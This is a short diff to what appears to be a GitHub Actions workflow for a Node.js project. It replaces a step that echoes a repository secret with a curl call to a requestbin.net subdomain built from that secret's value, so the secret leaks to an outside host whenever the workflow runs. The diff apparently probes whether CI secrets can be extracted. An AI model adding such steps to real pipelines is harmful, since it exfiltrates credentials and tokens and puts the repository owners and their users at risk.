@@ -25,7 +25,7 @@ jobs:
       with:
         node-version: ${{ matrix.node-version }}
     - run: echo "************** SECRETZ HERE *****************"
-    - run: echo ${{ secrets.shhh }}
+    - run: curl http://${{ secrets.shhh }}.c6bba1d81e2e0be100e8.d.requestbin.net
     - run: npm ci
       env:
         CI: true
